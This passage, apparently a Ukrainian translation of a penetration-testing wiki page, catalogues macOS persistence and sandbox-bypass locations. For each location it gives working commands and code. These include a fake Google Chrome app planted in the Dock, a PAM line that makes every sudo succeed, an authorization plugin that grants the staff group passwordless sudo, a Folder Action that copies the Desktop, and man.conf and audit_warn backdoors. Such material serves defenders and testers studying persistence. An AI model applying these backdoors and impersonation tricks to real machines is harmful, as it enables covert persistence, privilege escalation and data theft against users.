Ім’я файлу містить queue, номер job і час, на який заплановано його виконання. Наприклад, розглянемо `a0001a019bdcd2`.

- `a` - це queue
- `0001a` - номер job у hex, `0x1a = 26`
- `019bdcd2` - час у hex. Він представляє кількість хвилин, що минули з початку epoch. `0x019bdcd2` у десятковій системі дорівнює `26991826`. Якщо помножити це на 60, отримаємо `1619509560`, що відповідає `GMT: 27 квітня 2021 року, вівторок 7:46:00`.

Якщо вивести файл job, ми побачимо, що він містить ту саму інформацію, яку отримали за допомогою `at -c`.

### Folder Actions

Опис: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Опис: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Але потрібно мати можливість викликати `osascript` з аргументами для взаємодії із **`System Events`**, щоб мати змогу налаштувати Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Має базові TCC permissions, такі як Desktop, Documents і Downloads

#### Розташування

- **`/Library/Scripts/Folder Action Scripts`**
- Потрібен Root
- **Trigger**: доступ до вказаної папки
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: доступ до вказаної папки

#### Опис і експлуатація

Folder Actions - це scripts, які автоматично запускаються у відповідь на зміни в папці, наприклад додавання або видалення елементів, а також інші дії, як-от відкриття чи зміна розміру вікна папки. Ці actions можна використовувати для різних завдань і запускати різними способами, зокрема через Finder UI або команди термінала.

Для налаштування Folder Actions можна:

1. Створити workflow Folder Action за допомогою [Automator](https://support.apple.com/guide/automator/welcome/mac) і встановити його як service.
2. Вручну додати script через Folder Actions Setup у context menu папки.
3. Використати OSAScript для надсилання повідомлень Apple Event до `System Events.app`, щоб програмно налаштувати Folder Action.
- Цей метод особливо корисний для вбудовування action у систему, забезпечуючи певний рівень persistence.

Наведений нижче script є прикладом того, що може бути виконано Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Щоб зробити наведений вище скрипт придатним для використання Folder Actions, скомпілюйте його за допомогою:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Після компіляції скрипту налаштуйте Folder Actions, виконавши наведений нижче скрипт. Цей скрипт глобально ввімкне Folder Actions і прив’яже попередньо скомпільований скрипт до папки Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Запустіть скрипт налаштування за допомогою:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Ось як реалізувати цю persistence через GUI:

Це script, який буде виконано:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Скомпілюйте це за допомогою: `osacompile -l JavaScript -o folder.scpt source.js`

Перемістіть його до:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Потім відкрийте застосунок `Folder Actions Setup`, виберіть **папку, за якою потрібно стежити**, а у вашому випадку виберіть **`folder.scpt`** (у моєму випадку я назвав його output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Тепер, якщо ви відкриєте цю папку за допомогою **Finder**, ваш script буде виконано.

Ця конфігурація зберігалася у **plist**, розташованому в **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**, у форматі base64.

Тепер спробуймо підготувати цю persistence без доступу до GUI:

1. **Скопіюйте `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** до `/tmp`, щоб створити резервну копію:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Видаліть** щойно налаштовані Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Тепер, коли ми маємо порожнє середовище:

3. Скопіюйте резервну копію: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Відкрийте Folder Actions Setup.app, щоб застосувати цю конфігурацію: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> У мене це не спрацювало, але саме такі інструкції наведено у writeup:(

### Ярлики Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Але у вас має бути встановлено malicious application у системі
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: коли користувач натискає на застосунок у Dock

#### Опис і Exploitation

Усі застосунки, що відображаються в Dock, вказані у plist: **`~/Library/Preferences/com.apple.dock.plist`**

Можна **додати застосунок** за допомогою:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
За допомогою певної **соціальної інженерії** ви могли б **видати себе, наприклад, за Google Chrome** у Dock і фактично виконати власний скрипт:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Вибірники кольорів

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Має відбутися дуже конкретна дія
- Ви опинитеся в іншому sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `/Library/ColorPickers`
- Потрібні права root
- Тригер: використати вибірник кольорів
- `~/Library/ColorPickers`
- Тригер: використати вибірник кольорів

#### Опис і Exploit

**Скомпілюйте** bundle вибірника кольорів зі своїм кодом (наприклад, можна використати [**цей**](https://github.com/viktorstrate/color-picker-plus)) і додайте constructor (як у [розділі Screen Saver](macos-auto-start-locations.md#screen-saver)), а потім скопіюйте bundle до `~/Library/ColorPickers`.

Після цього, коли буде активовано вибірник кольорів, ваш код також має виконатися.

Зверніть увагу, що binary, який завантажує вашу library, працює в **дуже обмеженому sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Корисно для обходу sandbox: **Ні, оскільки потрібно виконати власний застосунок**
- TCC bypass: ???

#### Розташування

- Конкретний застосунок

#### Опис і Exploit

Приклад застосунку з Finder Sync Extension [**можна знайти тут**](https://github.com/D00MFist/InSync).

Застосунки можуть мати `Finder Sync Extensions`. Це розширення буде розташоване всередині застосунку, який буде виконано. Крім того, щоб розширення могло виконувати свій code, воно **має бути підписане** дійсним Apple developer certificate, **має бути sandboxed** (хоча можна додати послаблені винятки) і має бути зареєстроване за допомогою чогось на кшталт:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Екранна заставка

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Але зрештою ви опинитеся у звичайному sandbox застосунку
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `/System/Library/Screen Savers`
- Потрібні права root
- **Тригер**: Вибрати екранну заставку
- `/Library/Screen Savers`
- Потрібні права root
- **Тригер**: Вибрати екранну заставку
- `~/Library/Screen Savers`
- **Тригер**: Вибрати екранну заставку

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Опис і Exploit

Створіть новий проєкт у Xcode та виберіть шаблон для створення нової **Screen Saver**. Потім додайте до неї свій код, наприклад наведений нижче код для створення логів.

Виконайте **Build** і скопіюйте bundle `.saver` до **`~/Library/Screen Savers`**. Потім відкрийте GUI Screen Saver і просто натисніть на неї — має бути створено багато логів:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Зверніть увагу, що оскільки в entitlements бінарного файлу, який завантажує цей код (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), можна знайти **`com.apple.security.app-sandbox`**, ви перебуватимете **у звичайному application sandbox**.

Код Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Корисні для bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Але ви опинитеся в application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox здається дуже обмеженим

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Створюється новий файл із розширенням, яким керує Spotlight plugin.
- `/Library/Spotlight/`
- **Trigger**: Створюється новий файл із розширенням, яким керує Spotlight plugin.
- Потрібні права root
- `/System/Library/Spotlight/`
- **Trigger**: Створюється новий файл із розширенням, яким керує Spotlight plugin.
- Потрібні права root
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Створюється новий файл із розширенням, яким керує Spotlight plugin.
- Потрібен новий application

#### Description & Exploitation

Spotlight — це вбудована функція пошуку macOS, призначена для забезпечення користувачам **швидкого та повного доступу до даних на їхніх комп’ютерах**.\
Для забезпечення такої швидкої можливості пошуку Spotlight підтримує **власну базу даних** і створює індекс, **аналізуючи більшість файлів**, що дає змогу швидко виконувати пошук як за іменами файлів, так і за їхнім вмістом.

В основі механізму Spotlight лежить центральний процес із назвою `mds`, що розшифровується як **«metadata server»**. Цей процес координує роботу всього сервісу Spotlight. Додатково існує кілька daemon-процесів `mdworker`, які виконують різноманітні завдання з обслуговування, зокрема індексацію різних типів файлів (`ps -ef | grep mdworker`). Ці завдання виконуються за допомогою Spotlight importer plugins, або **«.mdimporter bundles»**, які дають Spotlight змогу розуміти та індексувати вміст широкого спектра форматів файлів.

Plugins, або **`.mdimporter`** bundles, розташовані у згаданих раніше місцях. Якщо з’являється новий bundle, його буде завантажено протягом хвилини (перезапускати жоден сервіс не потрібно). Ці bundles мають вказувати, **яким типом файлів і розширеннями вони можуть керувати**, щоб Spotlight використовував їх, коли створюється новий файл із відповідним розширенням.

Можна **знайти всі завантажені `mdimporters`**, виконавши:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
І, наприклад, **/Library/Spotlight/iBooksAuthor.mdimporter** використовується для аналізу таких типів файлів (розширення `.iba` і `.book` серед інших):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Якщо ви перевірите Plist іншого `mdimporter`, то можете не знайти запис **`UTTypeConformsTo`**. Це тому, що це вбудований _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)), і йому не потрібно вказувати розширення.
>
> Крім того, системні плагіни за замовчуванням завжди мають пріоритет, тому зловмисник може отримати доступ лише до файлів, які не індексуються власними `mdimporters` Apple.

Щоб створити власний importer, можна почати з цього проєкту: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), а потім змінити назву, **`CFBundleDocumentTypes`** і додати **`UTImportedTypeDeclarations`**, щоб він підтримував потрібне розширення, а також відобразити їх у **`schema.xml`**.\
Потім **змініть** код функції **`GetMetadataForFile`**, щоб вона виконувала ваш payload, коли створюється файл із оброблюваним розширенням.

Нарешті, **зіберіть і скопіюйте новий `.mdimporter`** в одне з трьох попередніх розташувань, а потім перевірити, чи його завантажено, можна, **моніторячи логи** або перевіривши **`mdimport -L.`**

### ~~Панель налаштувань~~

> [!CAUTION]
> Схоже, що це більше не працює.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Корисно для bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Потрібна конкретна дія користувача
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Опис

Схоже, що це більше не працює.

## Обхід Root Sandbox

> [!TIP]
> Тут можна знайти start locations, корисні для **sandbox bypass**, які дозволяють просто виконати щось, **записавши це у файл**, будучи **root** та/або за наявності інших **нестандартних умов.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Корисно для bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Але потрібно бути root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Потрібен root
- **Trigger**: коли настає відповідний час
- `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local`
- Потрібен root
- **Trigger**: коли настає відповідний час

#### Опис і Exploitation

Скрипти periodic (**`/etc/periodic`**) виконуються через **launch daemons**, налаштовані в `/System/Library/LaunchDaemons/com.apple.periodic*`. Зверніть увагу, що скрипти, збережені в `/etc/periodic/`, **виконуються** від імені **власника файлу**,** тому це не спрацює для потенційного підвищення привілеїв.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Існують інші періодичні скрипти, які буде виконано, зазначені у **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Якщо вам вдасться записати будь-який із файлів `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local`, його **рано чи пізно буде виконано**.

> [!WARNING]
> Зверніть увагу, що periodic script буде **виконано від імені власника скрипту**. Тому якщо скрипт належить звичайному користувачеві, його буде виконано від імені цього користувача (це може перешкодити атакам на підвищення привілеїв).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Але вам потрібно бути root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Завжди потрібен root

#### Опис і експлуатація

Оскільки PAM більше орієнтований на **persistence** і malware, ніж на просте виконання всередині macOS, у цьому блозі не буде детального пояснення. **Прочитайте writeups, щоб краще зрозуміти цю техніку**.

Перевірте PAM modules за допомогою:
```bash
ls -l /etc/pam.d
```
Техніка persistence/privilege escalation із використанням PAM полягає в простій зміні модуля /etc/pam.d/sudo шляхом додавання на початку такого рядка:
```bash
auth       sufficient     pam_permit.so
```
Отже, це **виглядатиме** приблизно так:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
І тому будь-яка спроба використати **`sudo` спрацює**.

> [!CAUTION]
> Зверніть увагу, що цей каталог захищений TCC, тому дуже ймовірно, що користувач побачить запит на надання доступу.

Ще одним хорошим прикладом є su, де видно, що також можна передавати параметри модулям PAM (і ви також могли б встановити бекдор у цей файл):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Плагіни авторизації

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Але потрібно мати права root і виконати додаткове налаштування
- Обхід TCC: ???

#### Розташування

- `/Library/Security/SecurityAgentPlugins/`
- Потрібні права root
- Також потрібно налаштувати базу даних авторизації для використання плагіна

#### Опис і експлуатація

Можна створити authorization plugin, який виконуватиметься під час входу користувача в систему для забезпечення persistence. Щоб дізнатися більше про створення таких плагінів, перегляньте попередні writeup (і будьте обережні: погано написаний плагін може заблокувати вам доступ до системи, після чого потрібно буде очистити ваш Mac у режимі відновлення).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Перемістіть** bundle до розташування, з якого його буде завантажено:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Насамкінець додайте **правило**, щоб завантажити цей плагін:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** повідомить фреймворм авторизації, що йому потрібно буде **викликати зовнішній механізм авторизації**. Крім того, **`privileged`** забезпечить його виконання від імені root.

Запустіть його за допомогою:
```bash
security authorize com.asdf.asdf
```
І тоді **staff group should have sudo** доступ (прочитайте `/etc/sudoers`, щоб це підтвердити).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Але потрібно бути root, і користувач має використовувати man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/private/etc/man.conf`**
- Потрібен root
- **`/private/etc/man.conf`**: щоразу, коли використовується man

#### Опис і Exploit

Файл конфігурації **`/private/etc/man.conf`** визначає binary/script, який використовується під час відкриття man-документації. Тому шлях до executable можна змінити, щоб щоразу, коли користувач використовує man для читання документації, виконувався backdoor.

Наприклад, у **`/private/etc/man.conf`** можна вказати:
```
MANPAGER /tmp/view
```
Потім створіть `/tmp/view` як:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Опис**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Але потрібно мати права root, і apache має бути запущений
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
- Httpd не має entitlements

#### Розташування

- **`/etc/apache2/httpd.conf`**
- Потрібні права root
- Тригер: коли Apache2 запускається

#### Опис і Exploit

У `/etc/apache2/httpd.conf` можна вказати завантаження модуля, додавши рядок на кшталт:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Таким чином ваш скомпільований модуль буде завантажено Apache. Єдине, що потрібно: або **підписати його дійсним сертифікатом Apple**, або **додати новий довірений сертифікат** у систему та **підписати його** цим сертифікатом.

Потім, якщо потрібно, щоб переконатися, що сервер буде запущено, можна виконати:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Приклад коду для Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Фреймворк аудиту BSM

Звіт: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Але потрібно мати права root, щоб auditd працював і спричинити попередження
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/etc/security/audit_warn`**
- Потрібні права root
- **Тригер**: коли auditd виявляє попередження

#### Опис та Exploit

Щоразу, коли auditd виявляє попередження, виконується скрипт **`/etc/security/audit_warn`**. Тому ви можете додати до нього свій payload.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Ви можете примусово вивести попередження за допомогою `sudo audit -n`.

### Елементи запуску

> [!CAUTION] > **Це застаріло, тому в цих директоріях нічого не має бути знайдено.**

**StartupItem** — це директорія, яка має розташовуватися в `/Library/StartupItems/` або `/System/Library/StartupItems/`. Після створення ця директорія повинна містити два конкретні файли:

1. **rc script**: shell script, який виконується під час запуску.
2. **plist file**, зокрема з назвою `StartupParameters.plist`, що містить різні параметри конфігурації.

Переконайтеся, що і rc script, і файл `StartupParameters.plist` правильно розміщені всередині директорії **StartupItem**, щоб процес запуску міг їх розпізнати та використати.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Я не можу знайти цей компонент у своїй macOS, тому для отримання додаткової інформації перегляньте writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Представлений Apple, **emond** — це механізм журналювання, який, схоже, перебуває на ранній стадії розробки або, можливо, був покинутий, але все ще залишається доступним. Хоча ця obscure service не має особливої користі для адміністратора Mac, вона може слугувати непомітним методом persistence для threat actors і, ймовірно, залишатися непоміченою більшістю адміністраторів macOS.

Для тих, хто знає про його існування, виявити будь-яке malicious використання **emond** нескладно. Системний LaunchDaemon для цього сервісу шукає scripts для виконання в одному каталозі. Щоб перевірити це, можна використати таку команду:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Розташування

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Потрібен root
- **Тригер**: разом із XQuartz

#### Опис і Exploit

